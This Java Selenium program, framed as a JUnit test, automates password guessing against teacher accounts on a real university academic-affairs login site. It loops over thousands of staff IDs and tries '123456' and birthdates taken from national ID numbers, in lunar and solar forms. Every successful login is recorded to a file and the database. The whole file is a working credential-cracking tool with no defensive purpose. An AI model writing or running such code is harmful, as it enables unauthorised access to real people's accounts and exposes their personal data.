package com.ycs.selenium;

import javax.annotation.Resource;

import org.junit.Test;
import org.openqa.selenium.By;
import org.openqa.selenium.JavascriptExecutor;
import org.openqa.selenium.WebDriver;
import org.springframework.stereotype.Component;
import org.springframework.test.annotation.Rollback;

import com.linux.GetDriver;
import com.ycs.model.service.StudentInfoService;
import com.ycs.model.service.TeacherinfoService;
import com.ycs.util.DateUtil;
import com.ycs.util.MyUtil;
import com.ycs.util.SeleniumUtil;

@Component
public class TeacherJiaoWuPass{
	@Resource
	protected StudentInfoService studentInfoService;
	protected WebDriver driver;
	protected JavascriptExecutor jse;
	@Resource
	protected TeacherinfoService teacherinfoService;

	public void start() {
		System.out.println("start");
		driver=GetDriver.getDriver();
//		driver=SeleniumUtil.getChromeDriver();
		jse = (JavascriptExecutor) driver;
	}
	public void shutdown(){
		System.out.println("shutdown");
		driver.quit();
	}
	public void restart(){
		System.out.println("restart");
		SeleniumUtil.fileWrite("driver.txt",MyUtil.getFormatDate(""));
		shutdown();
		start();
	}
	
	@Rollback(false)
	@Test
	public void test(){
		startPass(945);
	}

	public void startPass(int start){
		start();
		
		String userName="";
		String userPass="";
		String[] strs=new String[2];
		int restart=0;
		for(int id=start;id<=3722;id++){
			//读取用户名和密码					
			strs=teacherinfoService.getPass(id);
			userName=strs[0];
			userPass=strs[1];
			try {
				//根据身份证循环可能的密码
				pass(userName, userPass, id);
				restart=0;
			} catch (Exception e) {
				System.out.println("phantomjs exception");
				if(restart<5){
					System.out.println("restart right now");
					id--;
					restart();
					restart++;
				}
			}
			
		}

		
		shutdown();
	}
	
	public boolean pass(String userName, String userPass, int id) {
		int base=8;
		String passSub;
		String passTo;
		
		//进行123456破解
		passSub="123456";
		record(userName, passSub, id, "123456");
		if(login(userName, passSub, id,"123456")) return true;
		
		//身份证生日破解
		passSub=userPass.substring(base,base+6);
		record(userName, passSub, id, base+"");
		//破解成功退出整个for循环，进行下一个id的破解
		if(login(userName, passSub, id,base+"")) return true;

		passSub=userPass.substring(base-2,base+8);
		//转换为农历破解
		passTo=DateUtil.solarToLunarString(passSub).substring(2);
		record(userName, passTo, id, "lunar");
		if(login(userName, passTo, id,"lunar")) return true;
		
		//转换为新历破解
		passTo=DateUtil.lunarToSolarString(passSub).substring(2);
		record(userName, passTo, id, "solar");
		if(login(userName, passTo, id,"solar")) return true;
		
		
		return false;
	}
	public void record(String userName, String passSub, int id,String type) {
		System.out.println(id+","+type+","+userName+"_"+passSub+MyUtil.getFormatDate("-dd_HH:mm:ss")+"---------------------------------------------");
	}
	
	
	
	public boolean login(String userName,String userPass,int id,String type){
		String url = "http://jiaowu.sicau.edu.cn/web/web/web/index.asp";
		String check="http://jiaowu.sicau.edu.cn/jiaoshi/bangong/check.asp";
		
		driver.get(url);
		driver.findElement(By.xpath("//*[@id=\"username\"]")).sendKeys(userName);
		driver.findElement(By.xpath("//*[@id=\"password\"]")).sendKeys(userPass);
		driver.findElement(By.xpath("/html/body/div/div[3]/div/div/div[2]/fieldset/form/p[3]/input[2]")).click();
		driver.findElement(By.xpath("//*[@id=\"submit\"]")).click();

		String nowUrl="";
		nowUrl=driver.getCurrentUrl();
//		System.out.println(nowUrl);
		if(!nowUrl.equals(url)&&!nowUrl.equals(check)&&!nowUrl.equals("")&&!nowUrl.equals(null)){
			//更新密码字段
			teacherinfoService.updatePass(id, userPass);
			SeleniumUtil.fileWrite("pass.txt",id+","+type+","+userName+"_"+userPass+MyUtil.getFormatDate("-dd_HH:mm:ss")+"\tYES"+"\t"+nowUrl);
			System.out.println("YES:"+id+","+type+","+userName+"_"+userPass+MyUtil.getFormatDate("-dd_HH:mm:ss")+"*********************************************************");
			return true;
		}else{
			SeleniumUtil.fileWrite("pass.txt",id+","+type+","+userName+"_"+userPass+MyUtil.getFormatDate("-dd_HH:mm:ss")+"\tNO");
			System.out.println("NO:"+id+","+type+","+userName+"_"+userPass+MyUtil.getFormatDate("-dd_HH:mm:ss"));
			return false;
		}
	}


}
